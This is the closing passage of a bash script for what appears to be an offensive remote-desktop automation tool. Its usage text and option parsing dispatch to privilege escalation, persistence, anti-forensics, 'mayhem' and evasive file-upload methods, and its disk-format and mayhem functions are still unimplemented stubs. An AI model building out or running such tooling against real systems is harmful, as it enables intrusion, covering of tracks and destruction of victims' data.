            ;;
    esac
}

function format_disk() {
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    echo "not implemented"
}

function mayhem() {
    local mayhem_method="${1}"
    local mayhem_action="${2}"
    local platform="${3}"

    echo "not implemented"
}

function usage() {
    read -d '' usage << EndOfText
Usage:
    $(basename ${0}) <flags>

Flags:

COMMON OPTIONS:
    -c, --command <command | file>      Specify a command or a file contains commands
                                        to execute

    -p, --platform <operating_system>   Specify the operating system ("windows" is
                                        set by default if not specified)

    -w, --windowname <window_name>      Specify the window name to focus on the
					active window ("freerdp" is set by default
					if not specified)

    -h, --help                          Display this help message

UPLOAD FILES:
    -i, --input <input_file>            Specify the local input file to transfer
    -o, --output <output_file>          Specify the remote output file to transfer

METHODS:
    -m, --method <method>               Specify a method. For command execution method
                                        "none" is set by default if not specified.
                                        For file transfer "pwshb64" is set by default
                                        if not specified. Other available methods are:
                                        "elevate", "persistence", "antiforensics", and
                                        "mayhem"

    -s, --submethod <submethod>         Specify a submethod from a method (applies
                                        with -m flag)

    -a, --action <action>               Specify an action from a method and/or
                                        submethod (applies with -m and/or -s flag)

    -e, --evasion <evasion>             Specify an evasion method for uploading files
                                        (only works for "pwshb64")
EndOfText

    echo "${usage}"
    exit 1
}

function main() {
    check_dependencies

    if [[ ${#} -eq 0 ]]
    then
        usage
    fi

    while [[ ${#} -gt 0 ]]
    do
        case ${1} in
            -c | --command)
                COMMAND="${2}"
                shift 2
                ;;
            -i | --input)
                INPUT="${2}"
                shift 2
                ;;
            -o | --output)
                OUTPUT="${2}"
                shift 2
                ;;
            -m | --method)
                METHOD="${2,,}"
                shift 2
                ;;
            -s | --submethod)
                SUBMETHOD="${2,,}"
                shift 2
                ;;
            -a | --action)
                ACTION="${2,,}"
                shift 2
                ;;
            -e | --evasion)
                EVASION="${2,,}"
                shift 2
                ;;
            -p | --platform)
                PLATFORM="${2,,}"
                shift 2
                ;;
            -w | --windowname)
                WINDOWNAME="${2}"
                shift 2
                ;;
            -h | --help)
                usage
                ;;
            *)
                echo "Invalid option: ${1}" >&2
                exit 1
                ;;
        esac
    done

	# If window name isn't specified it'll set to FreeRDP as default and checks if the program exists.
    if [[ (-z "${WINDOWNAME}" || "${WINDOWNAME,,}" == "freerdp") && -n $(get_window_sync_id "${WINDOWNAME}") ]]
    then
        WINDOWNAME="FreeRDP"
    elif [[ (-n "${WINDOWNAME}" && "${WINDOWNAME,,}" != "freerdp") && -n $(get_window_sync_id "${WINDOWNAME}") ]]
    then
		WINDOWNAME="${WINDOWNAME}"
    else
        print_status "error" "Application name is absent or invalid window name."
        exit 1
    fi

    if [[ ! -f "${COMMAND}" && -n "${COMMAND}" ]]
    then
        # When input is string and not a file. It executes command
        if [[ -z "${METHOD}" ]]
        then
            METHOD="none"
        fi
        execute "${COMMAND}" "${METHOD}"
    elif [[ -f "${COMMAND}" ]]
    then
        # Check if a file is passed as input then execute commands
        automate "${COMMAND}"
    fi

    # When the input for selecting an operating system is empty
    # it'll choose "windows" as default.
    if [[ -z "${PLATFORM}" ]]
    then
        PLATFORM="windows"
    elif [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
    then
        print_status "error" "Invalid or operating system not supported. Allowed values: 'windows' or 'linux'."
        exit 1
    fi

    if [[ -f "${INPUT}" && -n "${OUTPUT}" ]]
    then
        upload "${INPUT}" "${OUTPUT}" "${PLATFORM}" "${METHOD}" "${ACTION}" "${EVASION}"
    elif [[ "${METHOD}" == "elevate" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
    then
        elevate "${SUBMETHOD}" "${ACTION}" "${PLATFORM}"
    elif [[ "${METHOD}" == "persistence" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
    then
        persistence "${SUBMETHOD}" "${ACTION}" "${PLATFORM}"
    elif [[ "${METHOD}" == "antiforensics" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
    then
        antiforensics "${SUBMETHOD}" "${ACTION}" "${PLATFORM}"
    elif [[ "${METHOD}" == "mayhem" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
    then
        mayhem "${SUBMETHOD}" "${ACTION}" "${PLATFORM}"
    fi
}

main "${@}"

